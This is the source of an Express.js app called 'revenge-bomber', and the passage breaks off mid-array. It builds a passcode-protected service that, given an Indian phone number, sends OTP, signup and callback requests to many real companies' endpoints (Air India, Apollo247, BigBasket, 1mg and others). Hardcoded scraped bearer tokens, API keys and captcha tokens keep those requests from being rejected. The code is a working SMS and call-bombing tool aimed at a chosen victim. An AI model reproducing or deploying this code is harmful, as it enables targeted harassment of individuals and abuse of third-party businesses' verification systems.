// revenge-bomber/server.js
const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cookieParser());

const AUTH_COOKIE = 'bomber_auth';
const PASSCODE = 'jaya1987';

const requireAuth = (req, res, next) => {
  if (req.cookies[AUTH_COOKIE] === PASSCODE) {
    next();
  } else {
    if (req.xhr || req.path.startsWith('/api/')) {
      res.status(401).json({ error: 'Unauthorized' });
    } else {
      res.redirect('/');
    }
  }
};

app.get('/', (req, res) => {
  if (req.cookies[AUTH_COOKIE] === PASSCODE) {
    res.redirect('/dashboard');
  } else {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  }
});

app.post('/login', (req, res) => {
  const { passcode } = req.body;
  if (passcode === PASSCODE) {
    res.cookie(AUTH_COOKIE, PASSCODE, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    });
    res.json({ success: true, redirect: '/dashboard' });
  } else {
    res.status(401).json({ success: false, error: 'Invalid passcode' });
  }
});

app.get('/dashboard', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/logout', (req, res) => {
  res.clearCookie(AUTH_COOKIE);
  res.redirect('/');
});

app.post('/api/bomb', requireAuth, async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: 'Phone number required' });

  let normalized = phone.replace(/\s+/g, '');
  if (!normalized.startsWith('+')) {
    if (normalized.length === 10) normalized = '+91' + normalized;
    else if (normalized.length === 12 && normalized.startsWith('91')) normalized = '+' + normalized;
    else if (normalized.length === 13 && normalized.startsWith('+91')) { /* ok */ }
    else return res.status(400).json({ error: 'Invalid phone number. Use 10 digits or +91XXXXXXXXXX' });
  }
  const plain10 = normalized.slice(3);
  const with91 = '91' + plain10;

  const endpoints = [];

  // ------------------------------------------------------------------
  // ORIGINAL ENDPOINTS (from the first bomber tutorial)
  // ------------------------------------------------------------------
  endpoints.push({ name: 'apna_co_v1', url: 'https://production.apna.co/api/userprofile/v1/otp/', method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', 'Origin': 'https://apna.co' }, body: { phone_number: with91, retries: 0, hash_type: 'employer', source: 'employer' } });
  endpoints.push({ name: '1mg_create_token', url: 'https://www.1mg.com/pwa-dweb-api/auth/create_token', method: 'POST', headers: { 'Content-Type': 'application/json', 'Hkp-Platform': 'Healthkartplus-0.0.1-desktopweb', 'X-Access-Key': '1mg_client_access_key', 'X-Csrf-Token': 'fe122d46618c897015d9098af86152a82496d84d291c69dc290cf8cf527cbdf2e2a866a35be2c4836c7b85652af315638bbbea1355cc29a0a30d3fd81ea670b3' }, body: { number: plain10 } });
  endpoints.push({ name: '1mg_push_lead', url: 'https://www.1mg.com/pwa-dweb-api/api/labs/v1/lead/push_lead', method: 'POST', headers: { 'Content-Type': 'application/json', 'Hkp-Platform': 'Healthkartplus-0.0.1-desktopweb', 'X-Access-Key': '1mg_client_access_key', 'X-Csrf-Token': 'fe122d46618c897015d9098af86152a82496d84d291c69dc290cf8cf527cbdf2e2a866a35be2c4836c7b85652af315638bbbea1355cc29a0a30d3fd81ea670b3' }, body: { mobile_number: plain10, source: 'DWEB_PHARMA_HOME' } });
  endpoints.push({ name: '99acres', url: 'https://www.99acres.com/api-aggregator/auth/login/generate-otp?version2=true', method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorizationtoken': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NzkyNzI1NDgsImV4cCI6MTc3OTI3MzE0OCwiczMiOiJZbHA1V0ZkdWEwMUdMMmc1V1VSek0zQmhNbXBETjFWRFlrWjJRaXRpVjNkQ1JrcDVVM1pKUVVFclZWcFNRVVpyYm5KRksyWmhXakZsYlZJMWRIUmlWM28xTWtOTFkwRnVTVnBxTVUwMU9GUTFaV2d2WVZvclNrNHlhR2xEZVZrM2IwRm1kM2RaVW14cFlrZE1LMUJzUkZaYWVDdFpPVFZPZUVaalZUQjBZM2xLT0dOaWJWQlFaVlF5Um5GNlUzSk1hazR3TmtWd01UVjNkbkpZYVhwWGJEaEhVRGM1VW5aUlpsZHhXVnBhVlVaeFlpOUdhVmRaV1hnemNETXdTakJoVWsxVWFVVldZMUZTZUZKM2VHZEhWWGt6UmtOa1IyRXdPVXR4VjBoV1YzSkxSVE5DZVM5Tk1TdEdWbEJMVVVkSVZqUmlOWFZSWldOUVJuaE1VVm95UkZWcmMwTmFTelZTU1hoMlJWYzFTRlZ4TW1WVVJVbG1NVlJPWjJSU2MwUjJTRGsxVlRNNFdESXplRVZZUzFJNWFVVnNRbXhwVXpodWEybHpMMmwyTlcxRGJFTTRORU52Y0RKRkt6WXZia1pHYWxKdVNXbDFLM0E0WkdwWVFYUkNObnBFY0hSR2JtVm9OSG93UFFvPSIsImRhdGEiOiI0WjM0L3A2Z2pWY3A4MGhkQTk2SEtzTFNlR01XKzVXanVONERoUlh4OEVsOUZWUi94UjlqTGRteUUycnVsQnVPMG9mc0hRbVdBYzlXT2VVSEh4aVBXeUVSUTdTOHZUYThaS2JHSTdhT0FuVnA4WitSeGpBWmpzOXkwaXp1cDZJSTUzNDdYSnpYUWRXdjF4ZHdWM1N3QjNXRzZpRjVzN1g4QWUvRENudWFJTVVxbHhQb0lqWmp1WmZiS3BWSVFjQm9lbjlRSUw1anpxSEtyUXBqWVA1N0JWbDBncVd1WjlKcEMvQzc0V3dIU09SYXUvOERLUVVZRC9JYml2eEtnK2hHRjk0bVFLNnIzeU1uUUdVTkEwQkQrR0g4VnE2cmYzb0hUckdrdDJ4TS9wWT0iLCJ2IjoiMiIsInMxIjoiOEZIbjlOREhkcVV4OGIvVG9tQU5HaytLT2h6RjRnQjAiLCJzMiI6IkV2YW1qYmpsWCtWbzFlMyt1b1E2RFZ4YytkTGdQR3Y0In0.e2iMMwLxOZU_T_SZRvZBkaSaADrmCCINx1QuehH9zxA', 'Apitoken': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NzkyNzI1NzUuNjI0LCJleHAiOjE3NzkyNzI2OTUuNjI0LCJocSI6ImIxY2M0NWY5MmEzNWE4ZTkxMzExZWFlMGJkOTc1YzViIiwiaGIiOiJjNDg5YjViYzkwNjU4ZWUxMjQ4YmJjNTQwNzllOWJkMyIsIndiIjoiMGVhNzM0NzkwYTA2MzE3ODY0OGU5MzI3NjM5YmYwZWUifQ.NhOY7OGy6Po_1woYVAcO5Rkj9zYNOBWz5ZyzUK___nU', 'Deviceid': 'ff30edc83660f68292c903b4eb765e43' }, body: { mobile: `91-${plain10}`, countryCode: '91', mode: 'LOGIN_GENERATE', platform: 'desktop', source: 'homePage_Desktop', sellerPage: false, seamless: true } });
  endpoints.push({ name: 'aakash', url: 'https://antheapi.aakash.ac.in/api/generate-lead-otp', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Client-Id': 'a6fbf1d2-27c3-46e1-b149-0380e506b763' }, body: { mobile_psid: plain10, mobile_number: plain10, activity_type: 'aakash-myadmission-signup', webengageData: { profile: 'student', whatsapp_opt_in: true, method: 'mobile' } } });
  endpoints.push({ name: 'abhibus', url: 'https://www.abhibus.com/wap/sendOtp', method: 'POST', headers: { 'X-App-Name': 'nextgenweb', 'Cookie': '__cf_bm=c3i0_on4dY3cGIwremfFKvRolWh585O_K.kXpoZrVEs-1779272786.6863801-1.0.1.1-RFtBz2jpqmCMRB6EGb4Z4iQnbjiMtj1fNKFI.MWhFDwVtpdxHNGRdItBJrW7d2lfStbnUnCVan_JLYhrbqwP0EKovLEAN3Lm_dpOuMyki9gGDbTqqT3OX5Ujmre1jB6s' }, formData: () => { const fd = new FormData(); fd.append('mobile', plain10); fd.append('prd', 'mobile'); fd.append('userToken', '0cAFcWeA6P450rzEFRSU0GfnjnObrbQ2kVr_nZu18vDHDCgFt74HtnRqu9E84mD2uUbWw7tdR-3iDWhWzR0UNM-Bw-Lzvkp6I8B2DPEoPvs6feVntu0mK_3FhNUznLc5tVPdFIPC92ZK2VHK11IGuqYqnCRtjbiJHWy61z5-v36pivTtegvjQE0UbUeG-CjKQmW29rvP1RN5DE8e8sjI1yk9F6Oh4bEnpP2rdRScrNsjxB12xLAgKW-mBbKPZLtNWKXBshlR2ci13N1Axn1TBYaDOe1pY2Zvm1KSBCl1dpyVdNzoXdqOjvHgvgqPxoFEuiZNRoMheOU5CfKslETuwM1W0pQr1D0EDY86Y89SrrvfuLQMQ11fimotCuXJLWjaN-w5TIR63NYGA7BZ2FzL0kY0DMi1Vb9sztC2jg-UuKXqscYBAO9zgPciYChBtVFa8sSxGXEc5Hi1zM-2sHgeem6VDxaMdop4--up7LQz4lob1Qpgwri313AYUdvOG_jlBXFOCvZ8WYy5Szz_6hWcauHPBVSQP_S8_mkjnDhWqcp9dFPnmD1gNSAlOceL4V4ZfTPxH8zzLOITZXYywwdpnqqD7ej7EsM7Vj0X8I3zFhxlCB239Rz7XplPMBX9MkS-cvuDYc_4yGrULKcJnh5BmXoI2WC94l_AujEvfZB5ivhLnyfGtcJds4Er3fFYYzfrwTe5BSlGwPil1LAlEiKAosjllxmJZSkg-kjq3cUkOAG3qV803mQe3dBaINclRVchHuCp9v2m4H_9pZLwT6kUJMMTcdmZ2-LXq0LUrEY5i0FD9U_yW6EI9jI6_3viqZcyqY1Gn-3EPTLeJC6WUPEiyoB-9pVIfyQmXhjHVnsa2rk6H7Yl72NkObxwOxC6Fp2PeDwqdla12twf4ZPS1r3Vmn0ojsyckI8t39lFziz9zZOYHpnj0BPIb2GauQUvFan6Awl7mBq2dXOqODJXq0fx6XnKNKLUA0OZ5T3tfQOatjNakbuP_pg-kgBlcoZtzgze3KwzzUFrVL67gu0gPb5voAqnZIJAimbTXnHH-INydJd3Zm5gY4d3Ts0fWXjwokpK9xKXuGIlHEPmkikJaIE5evLYG2RT2kypn_rmVZgH8rzNGdXDusiCz41Atnic1VuOzP8TkbKmqX5KpDvvXLAWOb3dCCFjkHBturaeHobQBKNYz0gDYyi1NupFDI8TY82esaGs2pzPhXi9U-l17A6OX9A_YEZiWw3SFIIDxxB9rCTP5nTd0haqqKVkdHaCoLuMN2ZqXp-dXK922QmRo46LbtQix346RnETOuIxggTqhMiHrhD3E9DorlssDAexIEE6LNE8bflFAHYcsTNUalvn-OWeg-GZPba5PIirX9RffVAUcMNuG4DwwSXJXwL6rPhmYoMDyi8YoG3nbBw_CvpxtDUwzVD_ByU5nafNwcS-MPyxmtMFClKaLNL1XcHuXtsS4fn29jYhUB4V_6BzaeXB6QQWYMp_JjY9XlNBp-XhOVEcM6_zypae98LBv3p6vAuK9vcTqpKB6e2F_tqdid4wwHNeP8kiFmDvWu-NGyGCXDKdDHir3nEiYqeKiQmMSD4bykOJkOeyVDAFbKxij7U3xy-eahw6ZO3agU6W8-RGz9u05IwutarT6z9vk50Ffg1w7miFIetS-3EkoDULVlgNh0tUCZF_VtiDUr-S5iFhmZJRlsB1k6PIvlLpFSjEDtX-w645hOvjChv0c5gMYJGGqrB1sbYdZ9za-BDsNIzpsjlBpsSBwHFjx3860uHHzYJf1r7pMnSiZTxJUofatWp0XVw8BIyKK4XutxjPf2sIPtKjz9DqvUQWbdZymySpq-_oTgmZ0-OhubmIc87YaZkPj5bNUd7xM6jScjZyqz2vEXCwocAZuu7dZNy-ZjX5G7PFgcGz1-xii1h5cGwVUvSFfJVFaWne794vcZFSYmBUbKFL9oU5dgbHS-BfmAYbrmQzXsVYVp8umQxA7MqDZx7Uw5YN5hnVV6VkMm0auSo6YlSE9yP8zZK4hCRMDOyEZYwGyoRT0dXDKcg9HkEdeNwNZQ2rD0uX8pRvl4UTvRrNAtggbSZcj2mGtLJ5q9nwZ5vNC05N797vvWOS0NXDjeUClH9UIUEdmMPYjkbnsDeGhwil4TOh5nV32MipH_M-OaI3uPiyDFBXQfkEke50Zkg9ynQvCT-jZbdXOlfxyPADBYtnvwRb69QbZ32QSOSLhqavjKg8ZcU36nukThvjy3oxLGJ74u-ArND7AZAmKvny4VHNdY-SvsHbY2c8XkJpOQ7NmnEGROgL7nIlZyThHriFxlXrEhrxmwK6tau4Kw1PUXCgfx6UM6g6VKvpSQ90Pk1f1y6xxElQMPAeauV5WIgSrB36v9QQjPVHM6EzCet_7q36curfSjJPnMyIpocO_0v1nf8ZhJNrjGde5K'); fd.append('version', '10'); fd.append('api_exp', '{"exp_assured_new_user":"A","exp_feat_getbuslist":"v1","exp_ixigo_payment":"D","exp_service_cards":"2","exp_srp_outlier":"no","exp_srp_sort_weighted":"D","exp_srp_sort_weighted_1":"","exp_uber_seat":"A"}'); return fd; } });
  endpoints.push({ name: 'acko', url: 'https://www.acko.com/external/api/v2/send', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Write-Key': 'AvQ5tZYUHTm9TexmMxY9dBoJ9uAT1KHo' }, body: { event_type: 'track', event_name: 'tap_send_otp_cta', event_properties: { phone: plain10, page: 'https://www.acko.com/authn/v1/signin?client_id=acko_webapp&redirect_uri=https%3A%2F%2Fwww.acko.com%2Fplatform%2Fauth%2Ftoken%2Facko_webapp&response_type=code&identity_type=d2c&scope=offline_access&realm=acko', path: '/authn/v1/signin', platform: 'web', product: 'universal', client_id: 'acko_webapp', redirect_uri: 'https://www.acko.com/platform/auth/token/acko_webapp', identity_type: 'd2c', realm: 'acko' }, anonymous_id: '3ab6a7c0-2710-49fb-af2c-28441ed405e7' } });
  endpoints.push({ name: 'actcorp', url: 'https://www.actcorp.in/check-order', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, bodyForm: `service_available=&bo-home-or-office=home&bo-search-full-address=&bo-addr=&bo-pref-plan=&bo-pref-offer=&bo-pref-month=&referrer=&bo_state=Karnataka&bo_pincode=560073&bo_location_city=Bengaluru&latitude=13.0303239&longitude=77.4831659&cta=Top+NC+button&explore_plan_njourney=1&for_home=48&name=roopa&phone_number=${plain10}&city=3&address=123+cars%2C+Tippenahalli%2C+Bengaluru%2C+Karnataka+560073%2C+India&company_name=&email=&multi_story_option=off&society=&comm_area=&comm_branch=&current_url=https%3A%2F%2Fwww.actcorp.in%2F` });
  endpoints.push({ name: 'airindia', url: 'https://api.airindia.com/ai-users/v1/auth/signup/init', method: 'POST', headers: { 'Content-Type': 'application/json', 'Ocp-Apim-Subscription-Key': '8ea658f3ac1e44cca129d7ed252d4c42', 'X-Request-Source': 'website', 'X-Country-Code': 'US' }, body: { phone: { countryCode: '91', number: plain10, _combinedNumber: `91${plain10}` }, preferences: true } });
  endpoints.push({ name: 'airtel_tv', url: 'https://api.airtel.tv/v2/user/profile/generateOtp?appId=WEB', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Atv-Did': 'ad9a760d-af36-4f47-80c5-720a22cf3dfe|BROWSER|WEBOS|-1|101|75.0.22|na|na', 'X-Atv-Utkn': 'nRoHBig0IpYr00fLmx-rznYO4b42:T6ReDfxVw1BrCW46aLaWq8KFA7I=' }, body: { msisdn: plain10, msgTxt: 'Use {OTP} as your login OTP. OTP is confidential' } });
  endpoints.push({ name: 'angelone', url: `https://kp-hl-httpapi-prod.angelone.in/oda-form?mobile=${plain10}&page_url=https%3A%2F%2Fwww.angelone.in%2F`, method: 'GET', headers: {} });
  endpoints.push({ name: 'apna_co_v2', url: 'https://production.apna.co/api/userprofile/v1/otp/', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { hash_type: 'original', phone_number: with91, request_id: `${Date.now()}`, retries: 0 } });
  endpoints.push({ name: 'apollo247', url: 'https://apigateway.apollo247.in/auth-service/generateOtp', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-App-Os': 'web', 'X-Apollo-Pre-Auth-Key': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZGVudGlmaWVyIjoiNjc3NjdlZWE2YmFiZGY4ZDI1ZjgyMjYyZTk4MzYzYzNlOWZiYmI0N2U3YzU1NjMzYmVhMjIyNmUzYzBiZGExMCIsImlzc3VlZEF0IjoxNzc5MjczODI1MTg4LCJkZXZpY2VJZCI6IkRlc2t0b3AiLCJpc3MiOiJBcG9sbG8yNDciLCJpYXQiOjE3NzkyNzM4MjUsImV4cCI6MTc3OTM2MDIyNX0.Oln-yTbOlEgqrSwsUNk7z_bgcdws67Wry6iEcDDjWU4naj4admHHDAqjxvVkRMcZJ9o1yty737eb_UkNfqgmHA8Ql_f7AYyPQJ_HYZSGI3NZ5oPtSEoBKLd7P8994ks6iNCifwcsdxZQJSfleS5b9oodoJVmezP4ix6d5ihlvwluae4Kl3Lg1Bju8Umhv41EHCaHr3zwDoAFhREk4eptQYyab0tluL7Rp0fX6E7vNE0bVfbV0Zx-aRHEY483gd0Tjyflx6WRuglTAWjMRLorpmlMMtmcwzSN8AtsFz6aeh29uwMxGbD1KXC3F6uRBGIfmQs5-hq1epIVnvtAV8-6JA', 'X-App-Device-Id': 'Desktop' }, body: { loginType: 'PATIENT', mobileNumber: `+${with91}` } });
  endpoints.push({ name: 'delhivery', url: `https://dlv-api.delhivery.com/v4/otp/generate/${plain10}`, method: 'GET', headers: { 'X-Aws-Waf-Token': '83e7f766-9128-4e72-bbf0-c0ef56992302:BQoAsPZKI8QWAAAA:WU3K8VXhyiDFj1bYGGLdHlolSHaoQ/oXI8T3qgqarmd4SkPR49DgUev3illTXmYdo12PzG+Gx+xPdTnPhULVqtQ7t93sQjW1kYEQgslz0P3aYAdvltrUonsBtIEv8FbRtFBegYHcOfzQ6xQXU9f9vteGDYhBSyjZ5Wes0RmQh++y8fIEDauduAwts5dh/7eTUORxaw==' } });
  endpoints.push({ name: 'bankbazaar', url: 'https://bankbazaar.com/auth/trigger-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { mobileNumber: plain10 } });
  endpoints.push({ name: 'bewakoof', url: 'https://api-prod.bewakoof.com/v3/user/auth/login/otp', method: 'POST', headers: { 'Content-Type': 'application/json', 'Api-Token': 'MWY5ZTNmNzFmN2M1ZTUyMjkwNjM2NGMzNmNjZTA3N2Q6M2RhMmI3OTgtNTY2MC00ZDRhLWJhZWQtNTZlMDI2MWRlYmZm', 'Ab-Id': '20', 'Client-Device-Token': 'MWY5ZTNmNzFmN2M1ZTUyMjkwNjM2NGMzNmNjZTA3N2Q6M2RhMmI3OTgtNTY2MC00ZDRhLWJhZWQtNTZlMDI2MWRlYmZm' }, body: { mobile: plain10, country_code: '+91' } });
  endpoints.push({ name: 'bharatmatrimony', url: 'https://greg.bharatmatrimony.com/', method: 'POST', headers: { 'Content-Type': 'application/json', 'Appversion': '0', 'Sessionvalue': '01KS2GHZWMVJ5FWESMG3R4HYYB' }, body: { query: `mutation RegisterBasicWebInfo($input: RegistrationBasicWebInput!) { registerBasicWebInfo(input: $input) { registerId registrationToken sessionValue phoneVerificationStatus status } }`, variables: { input: { profileCreatedFor: 'SELF', domainName: 'HINDI', device: {}, deviceToken: 'WEB', mobileCountryCode: 'INDIA', mobileNumber: plain10, name: 'qwrqwr', source: '00500000031', campaignTrackId: '00500000031', cookieType: 'internal', cookieVal: '172.20.17.68;172.20.5.61::005::::0::00500000027::Y::2026-05-20 16:29:09::', PageUrl: 'https://www.bharatmatrimony.com/#loginpopuprevamp' } } } });
  endpoints.push({ name: 'bigbasket', url: 'https://www.bigbasket.com/member-tdl/v3/member/otp', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Channel': 'BB-WEB', 'X-Caller': 'Monster-SVC', 'X-Csrftoken': 'M0jrjRYajbtJd9gM73XARnScQbzmEJj9zFRPse0K9GRUBue4pk8VA36RLSBDhCbz', 'X-Csurftoken': 'm9KBCA.MTI2MTc3NTAzNTQ1MzIxMzE2Ng==.1779274856655.AVpSegatJrA80qv5D5BZ+b/uqc1tfXi0sHk3utbqhr0=' }, body: { identifier: plain10, referrer: 'unified_login', recaptchaToken: '0cAFcWeA74mSV04gmvxre-b2R0e6A11gSkAt7WhaTUlEmZD94jn-flciV_FZ2prYZyDcwRgMqFI3kKvSR6qeytdkGF-mNs57gPfejO-iam3XoCatsGyAPXy79KGLy8gSmcXqNHveGvZQqPfOs_neQveU6Ya2p2MmOd3JWjswS6tWVEod30kljhkVPBcl5mVflFgFZtrej3KglsgLuLL-gKffLv9vSExfNY_55SqCNPXTxVDWw0M-SqmE5J-9xCx9-bhSbEzw8EoDiIW52WfXsOFevWw1epux9XGv7sht2ZKwKGO2mhD8IVgzgNLxu9VwU9G-iB8vijH1SLezPgKXp2wavzX8JbfVEEWADDik4WJP3kYeIwfpRfSHyl4OAAnvEcvfBZ0F4R8nHiV4B2FOuwoXKXd6yjq4Ij9hugaOKcDsRk0wMI77e394ualEwqjpGyzcbJF71-epQutM8KDp6LEs482xVFaR0Q60_LhJFrAXAAD6tjGNC2TPgEEM-4H-C6thevyEQbovGB7Zzc6DqUwmo3fiYNKvo-lZW_R-yjWecALjiid5svzZ8Sacav8xxGjnIUkN5Y-lVOgDjP5Tb1oNEdrK_3hX0Bl2I-ZUYKpW3gd3A3QU56TNWzLcDthFsh5IAnzSGVCK6uFyhQS7sCUu7xoda3Y4F0mtuLc2V8bvaoViGy1g3v3mUBobDtQxT30xiUWYvygSevlpasQlx0pulfFtJTTFAIpgCPkuHMGrwWwR9C59zpzO4gknpd2wEhHJy4eFx3HY78dXolktMTf74EAiV_Tp2m-W5HcfjEw2PvCGNSLww86F-YkxXpfkuLFAsg0ZzO23BFh0R2zWzKn_lD2v7fs8H5HrgCh0FYl2yHb8ZdpK0kCD5doCmsubAOpZctqqXSLNd21RrjrOsA1TVW25fW5ZNOF4-g9aIxhsY13rnh1F6qCzJvdBOzbdCQqcaZQE0uDUPOoN9ju6XtSTVrkTgjPveDDU_hwUgTuCGf0l-UiPOU3PM8TAv6bUXrgUbPIBHbJ77w1XopQKuKIz5ZF9nrK7QdEINTAlnA7f7UDwNtJQQl2BzVtbA6EE2gLmFpX3FoGeUQwBkFJjdhbvBfTqtm-3yMsXclVv5ksd6REwuAzLlo57Zd3hnoGVc8NuY7ZdMhRut5VDS2wNZlP2CohDpWNzbZNg9G3o_WZMYlz8Fnn-Sa-TXhtzlPrHTq22oaxjDaxmTRPBX4UTb8fT0CDjtJSCaMBOeQQKkwwNZnt7I21VVBK8QX579wqUY_hib8bQjUdAvHt-LtsVL3rN1DPTJfXJhglYL3waBkGDTUEFGeeRJcWRXGJi_JwaHh1CEDRDIcnsB3GY06OsTxOfqaVGNnEaUbUTv3cVUf2qCdcM900xxeE3pjyMVNSEUtvcrWjyMsa5h_fAMN44PgWG7mYp3sqZYtDyj9OL-07BvDX_YxaRmdffR4QT-RTKR_E_KvayrcBR_hzJUJIKMVaooOyw07ImLJ4Xgujqx36uq63THjGqiMTWQiE3Ah2LbQV7YFYqq63g6G6ffoprQ_uu8Cu27UzxBN3L7i-eOwt26vdMNa9S_xe_2eJ1did6e6UdBObCuKqYxcauP79mFQ01OThM_FTdhbmxmf5WrYrUZDjqgYPYxtqsuYSYpPJGFkABIO5GyoOD_7gwkqfIQEtSXCGPXj6H6fj4-SzIbg5FFy38-C0ZstxP3tAzLL7jJjGW791BI0uPjETkFGLwf89PvJNk88AQVbpZRoajSehZicZ8A1yQRLgfiv8NqFcYG-F7WtXdPSx5lYjzY5_adpPFYHh2WLx-Y9ulqmPkvs7O0p8yY0daZWicronKV-Fb41QxRAp9_HdfhtbLxZU46nlcJGxOE-f82UzHDTgh3EAF79Tg_2m1lUJoqvECsQgscQ3Kg96cVp58jtU7zPNzvgT4HtE4394-5N_qyhUbY1VbjLL9M5OVEdtGLgtvYNMTNQNP3AwEA3oY4JByOJuNhaqcQ-9Rd13LTcvHn7hz_8k6aDu5lK-kXZ36hLCzK04_Jisq2MU_Ytaf5tWGSp5cRkk7hdOZ0d9-oLKUckFTC6dYNI2U08kM5Fc9yVMDhh2o7PmgSmpapLMpfIKY-aRdP_OOEvrAhiuLNfCAQ3vLrnZvSVgBDWUo-bJgxK43xdTf9pjs-cbvCp7Eje8mwgjBFXPyArPaHcfhQw5hpS3hQCdAFL5mV9VDE4q-_aLy4y-5o6InbEDhRh5jgjTzNPodjRGfNC7fGIkoWXJ8sq_D_6QHnR7ByfvQlUGFPh0qZKX-ECxSBHpqvJq7dxAl5kPYcxTo4BWF-0JLRTTUfgxY2dnNZZaS4Lv7SakPHm-DkcohJqMpEK2IkoUAKmwFpxw1fJDtRD9dung1wpzYl5TGsnMDQzG1XUzulJAfySrLuRuMZ1-9tg8Bhq3lmEvctWBbJAJu2e6w6rYr8pTWfYqk2yvSkTaOgzjpV4JN3INLNzBnM7NcYkdXuX_h_A7iS29iDpeu9pWrG_4dbbSw' } });
  endpoints.push({ name: 'box8', url: 'https://accounts.box8.co.in/customers/sign_up?origin=box8&platform=web', method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer eyJraWQiOiIxZWQ1ZDFiNjI1NDY0MmFlOWEyZGU2NDQzZWZlZmI2Y2I4OTRkMjAwNjU0NGUzYzljOWE3N2JkM2UwYzkyNThhIiwiYWxnIjoiUlMyNTYifQ.eyJpYXQiOjE3NzkyNzU0OTEsImV4cCI6MTc3OTQwOTgwMCwic3NpZCI6IjY4ZmJjNGZiLThmNzYtNDg2Yy04MmJlLWUwNTllMWMyZWI1YzE3NzkyNzU0OTEiLCJhY2NfdHlwZSI6IkFub255bW91c0FjY291bnQiLCJwbGF0Zm9ybSI6IndlYiIsImRldmljZV9pZCI6ImtsemF5ZnMyLWVsdGctM283ei04MmZ3LWU5Y2M0dGZjYnAwOSIsImJyYW5kX2lkIjoxLCJhdWQiOiJjdXN0b21lciIsImlzcyI6ImFjY291bnRzLmJveDguY28uaW4ifQ.S48neGoos4b2R08CbQpdRSXPHKY8_44IbqF33bHlI-74zIWko4XTcFsBLn_BnCJGmNtaxAblYeKCZrr-1b1E6_s6LJx9wA6QRqynwcNL5A2E81p5CsrHIgRyZjvPeG5EaI8GDZKjE7EVJp2MCeLd0YuemOPu83KnmRx2fXvHKWi07121YEZykfWIyjy4A1I__UnUfELGdnv21YERWMkZ4D4_ZVHDoHlaOe5v0ZTHmMjT8X5fBlAKVmpzrBy0CjdfSFT5ILT2Njb1uyrfBt-PjPVvEVf95E76662k_WgeioKLEX8SopGMFtcPXZygP5aerg0iIE9lRaa57gj94SyVa6fylmQRARd3x9slTC7lpFN2JW1tKEYhlWtH80b1ap7secwDpyjo1mIVo7tNtZcnzquhoUylDRwdiAFI-NT-r88C_TXxtgvA96w3Cc9yiAosPPXzgN_XVXdPpYMKHL8o-mI1-Qnq04qfspdqVbWc6oIXScesib4X_P4TFAmBdVw8NLodi7hDcc1fAJOs3VDltmM_goQYCo7qmFVhWMi4UAmS0nqu-61Rz-AbHY-lknjaJBgXh-G-hW05ffNM5-Lp4ilYuNIT5GB012Oo2RoYRsc3IxeiLWrzQgF_xh9mcx_R5agCGh-yvY_OOCS1yJsUV9mMgaPHSv_o7VrmZuLcB5Y' }, body: { phone_no: plain10, name: 'john', email: `${uuidv4()}@de.com`, referral_code: '545454' } });
  endpoints.push({ name: 'gokwik', url: 'https://gkx.gokwik.co/v4/auth/otp/login/trigger', method: 'POST', headers: { 'Content-Type': 'application/json', 'Gk-Merchant-Id': '12wyqc2lkv1ku5f576t', 'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc3OTI3NTM1NiwiZXhwIjoxNzc5Mjc1NDE2fQ.PJxgqiANd_ZoY1m3DJYQUYAuTSb8YJqRD0N9QpavV24', 'Gk-Request-Id': '57b46e18-f6cd-4cbf-9fd4-0a923d78aff8' }, body: { phone: plain10, country: 'IN' } });
  endpoints.push({ name: 'bsesdelhi', url: 'https://ncbrpl.bsesdelhi.com/api/login/sendOtp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { mobileNo: parseInt(plain10), email: null, companyCode: 'BRPL' } });
  endpoints.push({ name: 'byjus', url: `https://mtnucleus.byjusweb.com/api/acs/voice?phoneNumber=${plain10}&page=free-trial-classes`, method: 'GET', headers: {} });

  // JSON list APIs (from apidata.json)
  const jsonApis = [
    { name: 'Vedantu', url: 'https://user.vedantu.com/user/preLoginVerification', method: 'POST', body: { email: null, event: 'NEW_FLOW', phoneCode: '+91', phoneNumber: plain10 } },
    { name: 'apsrtc_logistics', url: 'https://cargo.apsrtconline.in/api/customer//cust/fetchOtp', method: 'POST', body: { mobileNumber: plain10 } },
    { name: 'scapia', url: 'https://api.scapia.in/api/sendOTP', method: 'POST', body: { phoneNumber: with91, flow: 'SIGNUP', name: 'harini aman', firstName: 'harini', lastName: 'aman' } },
    { name: 'proptiger', url: 'https://www.proptiger.com/responsive/send-otp', method: 'POST', body: { contactNumber: plain10, domainId: '2' } },
    { name: 'NextGurukul', url: 'https://www.nextgurukul.in/nlp/nlp/register', method: 'POST', body: { action: 'register', username: plain10, phone: plain10, source: 'WEB' } },
    { name: 'ramfinecorp', url: 'https://loan-api.ramfincorp.com/customers/customer-login-byMobile?utm_source=Performance_Max_Custom_Audience', method: 'POST', body: { mobile: plain10 } },
    { name: 'kredbee', url: 'https://api.kreditbee.in/v1/me/otp', method: 'POST', body: { reason: 'loginOrRegister', mobile: plain10 } },
    { name: 'truval', url: 'https://www.marutisuzukitruevalue.com/api/sitecore/Forms/ResendOTP', method: 'POST', body: { MobileNumber: plain10, name: '' } },
